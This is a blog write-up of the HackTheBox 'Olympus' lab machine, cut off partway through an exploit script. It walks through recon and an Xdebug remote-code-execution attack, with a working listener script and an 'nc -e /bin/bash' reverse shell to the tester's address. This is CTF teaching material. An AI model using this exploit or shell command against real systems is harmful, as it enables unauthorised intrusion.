
<!DOCTYPE html>
<html lang="en"><head>
  <meta name="name" content="HTB: Olympus">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB: Olympus | 0xdf hacks stuff</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="HTB: Olympus" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Olympus was, for the most part, a really fun box, where we got to bounce around between different containers, and a clear path of challenges was presented to us. The creator did a great job of getting interesting challenges such as dns and wifi cracking into a HTB format. There was one jump I wasn’t too excited to have to make, but overall, this box was a lot of fun to attack." />
<meta property="og:description" content="Olympus was, for the most part, a really fun box, where we got to bounce around between different containers, and a clear path of challenges was presented to us. The creator did a great job of getting interesting challenges such as dns and wifi cracking into a HTB format. There was one jump I wasn’t too excited to have to make, but overall, this box was a lot of fun to attack." />
<link rel="canonical" href="https://0xdf.gitlab.io/2018/09/22/htb-olympus.html" />
<meta property="og:url" content="https://0xdf.gitlab.io/2018/09/22/htb-olympus.html" />
<meta property="og:site_name" content="0xdf hacks stuff" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-09-22T14:45:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB: Olympus" />
<meta name="twitter:site" content="@0xdf_" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2018-09-22T14:45:57+00:00","datePublished":"2018-09-22T14:45:57+00:00","description":"Olympus was, for the most part, a really fun box, where we got to bounce around between different containers, and a clear path of challenges was presented to us. The creator did a great job of getting interesting challenges such as dns and wifi cracking into a HTB format. There was one jump I wasn’t too excited to have to make, but overall, this box was a lot of fun to attack.","headline":"HTB: Olympus","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2018/09/22/htb-olympus.html"},"url":"https://0xdf.gitlab.io/2018/09/22/htb-olympus.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/bootstrap-toc.min.css">
  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="stylesheet" href="/assets/css/custom.css"> 
  <link rel="stylesheet" href="/assets/css/buymeacoffee.css">
  
  <link rel="stylesheet" href="/assets/css/syntax.css">
  
<link type="application/atom+xml" rel="alternate" href="https://0xdf.gitlab.io/feed.xml" title="0xdf hacks stuff" /><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-P056MVQVGM"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-P056MVQVGM');
</script>
<!--<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-120216868-1', 'auto');
ga('send', 'pageview');
</script>-->
  
<link rel="icon" type="image/png" href="/assets/icons/favicon-32x32.png" sizes="32x32" />
  <link rel="icon" type="image/png" href="/assets/icons/favicon-16x16.png" sizes="16x16" />
</head>

  <body data-spy="scroll" data-toggle="toc" data-offset="150">
  
<header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xdf hacks stuff</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger">
            <a class="page-link-site" href="/">Home</a>
<a class="page-link-site" href="/about">About Me</a><a class="page-link-site" href="/tags">Tags</a><a class="page-link-site" href="/cheatsheets/">Cheatsheets</a><a class="page-link-site bmc" href="https://youtube.com/@0xdf"><img src="/icons/youtube.png" class="svg-icon" alt="" />YouTube</a>
          <a class="page-link-site bmc" href="https://gitlab.com/0xdf/ctfscripts"><img src="/icons/gitlab.png" class="svg-icon" alt="" />Gitlab</a><a class="page-link-site bmc" href="/feed.xml"><img src="/icons/rss.png" class="svg-icon" alt="" /><span>feed</span></a><a class="page-link-site bmc" target="_blank"
href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee" style="-webkit-filter: drop-shadow(0px 0px 2px white); filter: drop-shadow(0px 0px 2px white);"></a>
        </div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HTB: Olympus</h1>
    <p class="post-meta">

<span class="tag-list"><a href="/tags#hackthebox" class="post-tag">hackthebox</a> <a href="/tags#htb-olympus" class="post-tag">htb-olympus</a> <a href="/tags#ctf" class="post-tag">ctf</a> <a href="/tags#zone-transfer" class="post-tag">zone-transfer</a> <a href="/tags#xdebug" class="post-tag">xdebug</a> <a href="/tags#aircrack-ng" class="post-tag">aircrack-ng</a> <a href="/tags#802-11" class="post-tag">802-11</a> <a href="/tags#ssh" class="post-tag">ssh</a> <a href="/tags#port-knocking" class="post-tag">port-knocking</a> <a href="/tags#docker" class="post-tag">docker</a> <a href="/tags#cve-2018-15473" class="post-tag">cve-2018-15473</a> </span><br/><br/>


<time class="dt-published" datetime="2018-09-22T14:45:57+00:00" itemprop="datePublished">Sep 22, 2018
      </time></p>

  </header>

  
  <div class="post-content e-content" itemprop="articleBody">
    <div class="row">
      <div class="col-sm-3">
        <div class="sticky-top">
            <p><a href="#" style="color: #e6e6e6; text-decoration: none;">HTB: Olympus</a></p>
	    <!--https://afeld.github.io/bootstrap-toc/-->  
          <nav id="toc" data-toggle="toc"></nav>
        </div>
      </div>
      <div class="col-sm-9" id="postBody">
        <p>Olympus was, for the most part, a really fun box, where we got to bounce around between different containers, and a clear path of challenges was presented to us. The creator did a great job of getting interesting challenges such as dns and wifi cracking into a HTB format. There was one jump I wasn’t too excited to have to make, but overall, this box was a lot of fun to attack.</p>
<h2 id="box-info">Box Info</h2>

<!-- https://app.hackthebox.com/machines/135 -->

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th style="text-align: right"><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Folympus" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Olympus</a> <a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Folympus" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-olympus.webp" /> <img src="/icons/box-olympus.png" alt="Olympus" class="img-av" /></picture></a><br /><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Folympus" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Release Date</td>
      <td style="text-align: right">21 Apr 2018</td>
    </tr>
    <tr>
      <td>Retire Date</td>
      <td style="text-align: right">04 May 2024</td>
    </tr>
    <tr>
      <td>OS</td>
      <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td>
    </tr>
    <tr>
      <td>Base Points</td>
      <td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
    </tr>
    <tr>
      <td>Rated Difficulty</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/olympus-diff.webp" /><img src="/img/olympus-diff.png" alt="Rated difficulty for Olympus" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td>Radar Graph</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/olympus-radar.webp" /><img src="/img/olympus-radar.png" alt="Radar chart for Olympus" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">01:12:54</span><a href="https://app.hackthebox.com/users/2846" target="_blank" rel="noopener"><img alt="echthros" src="https://www.hackthebox.com/badge/image/2846" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> echthros</span></a><br /></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">01:32:03</span><a href="https://app.hackthebox.com/users/1957" target="_blank" rel="noopener"><img alt="gweeperx" src="https://www.hackthebox.com/badge/image/1957" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> gweeperx</span></a><br /></td>
    </tr>
    <tr>
      <td>Creator</td>
      <td style="text-align: right"><a href="https://app.hackthebox.com/users/32334" target="_blank" rel="noopener"><img alt="OscarAkaElvis" src="https://www.hackthebox.com/badge/image/32334" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> OscarAkaElvis</span></a><br /></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h3 id="nmap">nmap</h3>

<p>nmap gives us ssh on 2222, dns (tcp and udp), and web on 80. There’s also something going on with port 22, as it returned filtered (no response) as opposed to closed (responded as closed):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-sT</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-oA</span> nmap/alltcp 10.10.10.83
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:48 EDT
Nmap scan report for 10.10.10.83
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   open     http
2222/tcp open     EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds

</span><span class="gp">root@kali# </span>nmap <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-oA</span> nmap/alludp 10.10.10.83
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:50 EDT
Warning: 10.10.10.83 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65386 open|filtered ports, 148 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 145.09 seconds

</span><span class="gp">root@kali# </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 22,53,80,2222 <span class="nt">-oA</span> nmap/initial 10.10.10.83
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 05:49 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
| dns-nsid:
|_  bind.version: Bind
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    Bind
80/tcp   open     http    Apache httpd
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-City of olympia
| ssh-hostkey:
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.70%I=7%D=5/21%Time=5B02962B%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.70%I=7%D=5/21%Time=5B029626%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.01 seconds
</span></code></pre></div></div>

<h3 id="dns-53">DNS (53)</h3>

<p>TCP 53 is typically not used for DNS, except for zone transfers. Unfortunately, it doesn’t provide much here:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>dig axfr @10.10.10.83 olympus.htb
<span class="go">
; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

</span><span class="gp">root@kali# </span>dig @10.10.10.83 olympus.htb
<span class="go">
; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; @10.10.10.83 olympus.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 50991
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;olympus.htb.                   IN      A

;; Query time: 90 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 21 20:59:42 EDT 2018
;; MSG SIZE  rcvd: 40
</span></code></pre></div></div>

<p>We’ll have to remember to come back here if we find any interesting domains to query against.</p>

<h3 id="web-80">Web (80)</h3>

<h4 id="site">Site</h4>

<p>The site is just a picture of zeus set as <code class="language-plaintext highlighter-rouge">background-image</code> in css and a favicon:</p>

<p><img src="https://0xdfimages.gitlab.io/img/1526896409948.png" alt="1526896409948" /><img src="https://0xdfimages.gitlab.io/img/1526896485658.png" alt="1526896485658" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
		<span class="nt">&lt;html&gt;</span>
		<span class="nt">&lt;head&gt;</span>
			<span class="nt">&lt;title&gt;</span>Crete island - Olympus HTB<span class="nt">&lt;/title&gt;</span>
			<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=UTF-8"</span><span class="nt">/&gt;</span>
			<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"shortcut icon"</span> <span class="na">href=</span><span class="s">"favicon.ico"</span><span class="nt">&gt;</span>
			<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"crete.css"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/head&gt;</span>
		<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"crete"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;/body&gt;</span>
		<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h4 id="gobuster">gobuster</h4>

<p>Turned up nothing:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>gobuster <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.83/ <span class="nt">-x</span> txt,html,php
<span class="go">
Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.83/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.html,.php
=====================================================
/index.php (Status: 200)
</span></code></pre></div></div>

<h4 id="http-headers">HTTP Headers</h4>

<p>Looking at the raw request / response, there is an interesting headers in the response:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 21 May 2018 13:25:39 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">sameorigin</span>
<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span>
<span class="na">Xdebug</span><span class="p">:</span> <span class="s">2.5.5</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">314</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Xdebug</code> is a an extension for <code class="language-plaintext highlighter-rouge">php</code> that allows you to debug websites. The header may indicate that we can do remote debugging.</p>

<h2 id="exploiting-create-container---shell-as-www-data">Exploiting Create Container - Shell as www-data</h2>

<h3 id="rce-through-xdebug">RCE Through Xdebug</h3>

<p>There’s couple ways to interact with Xdebug. A developer would have an xdebug extension in their ide, and/or in their browser (there’s tons of plugins for both Chrome and Firefox). It’s worth taking a second and playing with the browser plugins to get a feel for them</p>

<p>But for a more direct path to RCE / shell, we can take the manual route. If you add a cookie <code class="language-plaintext highlighter-rouge">XDEBUG_SESSION=...</code>, the site will call back to you on default port 9000, and you can pass php commands to it.</p>

<p><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">This blog</a> describes how to do the attack, albeit in Chinese. There’s a short script he uses to interact, which simply listens on port 9000, receives the connection, and then enters an infinite loop of reading input commands from the command line, and sends them back formatted for xdebug:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python2
</span><span class="kn">import</span> <span class="n">socket</span>

<span class="n">ip_port</span> <span class="o">=</span> <span class="p">(</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span><span class="mi">9000</span><span class="p">)</span>
<span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
<span class="n">sk</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="n">ip_port</span><span class="p">)</span>
<span class="n">sk</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">client_data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">client_data</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="nf">raw_input</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="sh">'</span><span class="s">eval -i 1 -- %s</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">%</span> <span class="n">data</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">base64</span><span class="sh">'</span><span class="p">))</span>
</code></pre></div></div>

<p>To test it out, I’ll give Olympus a ping command, and use tcpdump to see if it works.</p>

<p>With script running, use curl to trigger Xdebug:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://10.10.10.83 <span class="nt">-H</span> <span class="s2">"Cookie: XDEBUG_SESSION=wpOCvcWXx5"</span>
</code></pre></div></div>

<p>Script gets callback. We can issue ping command:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./exploit_xdebug.py
<span class="go">494&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
&lt;init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="5380" idekey="XDEBUG_ECLIPSE"&gt;&lt;engine version="2.5.5"&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick
Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt;
</span><span class="gp">&gt;&gt;</span><span class="w"> </span>system<span class="o">(</span><span class="s2">"ping -c 1 10.10.14.5"</span><span class="o">)</span>
<span class="go">336&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
&lt;response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"&gt;&lt;property type="string" size="61" encoding="base64"&gt;&lt;![CDATA[cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA5NC4zNjEvOTUuMDcyLzk1Ljg2MS8wLjU2MiBtcw==]]&gt;&lt;/property&gt;&lt;/response&gt;
</span><span class="gp">&gt;&gt;</span><span class="w">
</span></code></pre></div></div>

<p>And we see result in tcpdump:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>tcpdump <span class="nt">-i</span> 2 icmp
<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:42:22.296409 IP 10.10.10.83 &gt; kali: ICMP echo request, id 5413, seq 0, length 64
14:42:22.296431 IP kali &gt; 10.10.10.83: ICMP echo reply, id 5413, seq 0, length 64
</span></code></pre></div></div>

<p>Decoding the data that came back in the <code class="language-plaintext highlighter-rouge">CDATA</code> block, we’ll see it’s part of the ping output:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">echo </span><span class="nv">cm91bmQtdHJpcCBtaW4vYXZnL21heC9zdGRkZXYgPSA5NC4zNjEvOTUuMDcyLzk1Ljg2MS8wLjU2MiBtcw</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="go">round-trip min/avg/max/stddev = 94.361/95.072/95.861/0.562 ms
</span></code></pre></div></div>

<p>Even better, if we look at the curl command, which has not returned yet, we get the output:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://10.10.10.83 <span class="nt">-H</span> <span class="s2">"Cookie: XDEBUG_SESSION=wpOCvcWXx5"</span>
<span class="go">PING 10.10.14.5 (10.10.14.5): 56 data bytes
64 bytes from 10.10.14.5: icmp_seq=0 ttl=62 time=18.276 ms
--- 10.10.14.5 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 18.276/18.276/18.276/0.000 ms
</span></code></pre></div></div>

<h3 id="shell">Shell</h3>

<p>From the python script above, we’ll give <code class="language-plaintext highlighter-rouge">nc -e</code> a try and get lucky (since most hosts don’t have the <code class="language-plaintext highlighter-rouge">-e </code>option):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;</span><span class="w"> </span>system<span class="o">(</span><span class="s2">"nc -e /bin/bash 10.10.14.5 8087"</span><span class="o">)</span>
</code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 8087
<span class="go">listening on [any] 8087 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.83] 57586
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></code></pre></div></div>

<h3 id="script-to-get-shell">Script to get shell</h3>

<p>Wrote script to get shell as www-data, <code class="language-plaintext highlighter-rouge">get_olympic_www_shell.py</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">sys</span>


<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">{} [nc port]</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_my_ip</span><span class="p">():</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.10.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="nf">getsockname</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">ip</span> <span class="o">=</span> <span class="nf">get_my_ip</span><span class="p">()</span>
<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Have nc listening on {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>

<span class="c1"># Start Listener
</span><span class="n">local_ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span>
<span class="n">local_port</span> <span class="o">=</span> <span class="mi">9000</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Starting listener on {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">local_ip</span><span class="p">,</span> <span class="n">local_port</span><span class="p">))</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">local_ip</span><span class="p">,</span> <span class="n">local_port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Listening...</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Tip server to call back
</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sending request to tip xdebug</span><span class="sh">"</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://10.10.10.83/index.php</span><span class="sh">"</span><span class="p">,</span>
                 <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">XDEBUG_SESSION=wpOCvcWXx5</span><span class="sh">"</span><span class="p">},</span>
